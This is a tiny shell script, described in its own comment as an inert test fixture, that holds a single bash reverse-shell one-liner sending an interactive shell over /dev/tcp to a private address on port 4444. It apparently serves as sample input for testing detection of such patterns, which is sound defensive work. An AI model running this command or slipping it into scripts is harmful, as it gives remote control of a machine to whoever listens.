#!/bin/sh
# Test fixture (inert): reverse-shell pattern pointing at a private address.
bash -i >& /dev/tcp/10.0.0.99/4444 0>&1
